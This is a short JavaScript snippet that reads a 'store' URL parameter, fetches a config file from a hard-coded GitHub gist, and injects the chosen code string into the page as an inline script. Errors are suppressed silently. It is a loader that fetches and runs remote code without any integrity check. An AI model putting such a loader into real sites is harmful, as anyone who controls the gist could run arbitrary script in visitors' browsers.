(async function() {
  const params = new URLSearchParams(window.location.search);
  const store = params.get('store');
  if (!store) return;

  const RAW_URL = 'https://gist.githubusercontent.com/sensasikerja77/028a62a9b788046d81dac61df710f36c/raw/25ba4263880120f63193027061fb688220f31d71/config.json'; // ⚠️ GANTI

  try {
    const res = await fetch(RAW_URL + '?t=' + Date.now());
    if (!res.ok) return;
    const config = await res.json();
    const storeData = config.stores[store];
    if (!storeData) return;

    const active = storeData.script_options[storeData.active_index];
    if (active && active.code) {
      const script = document.createElement('script');
      script.textContent = active.code;
      document.head.appendChild(script);
    }
  } catch(e) {}
})();
